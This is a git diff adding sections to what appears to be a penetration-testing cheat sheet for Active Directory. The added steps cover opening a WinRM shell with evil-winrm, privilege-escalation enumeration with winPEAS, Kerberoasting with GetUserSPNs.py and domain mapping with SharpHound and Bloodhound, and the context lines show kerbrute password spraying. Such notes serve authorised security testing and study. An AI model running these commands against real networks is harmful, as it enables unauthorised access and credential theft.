@@ -45,3 +45,32 @@ https://github.com/TarlogicSecurity/kerbrute
 
 	kerbrute.py -users users.txt -passwords users.txt -domain <domain> -dc-ip <IP>
 	
+## Enumeration with credentials or post initial shell
+
+### Shell
+
+If WinRM is listening and exposed
+
+	evil-winrm -u <username> -p <password> -i <host or IP>
+	
+### Get groups and privs
+
+	whoami /all
+	
+### Your favorite priv escalation script
+
+	https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat
+	
+### Kerberos
+
+#### Kerberoasting
+
+	GetUserSPNs.py domain.name/user:password -outputfile kerbroast.txt
+	
+#### Bloodhound
+
+Use WinRM, meterpreter, etc. to upload SharpHound.ps1
+
+	.\SharpHound.ps1 -CollectionMethod all
+	
+Download the zip file and import into Bloodhound and go from there.
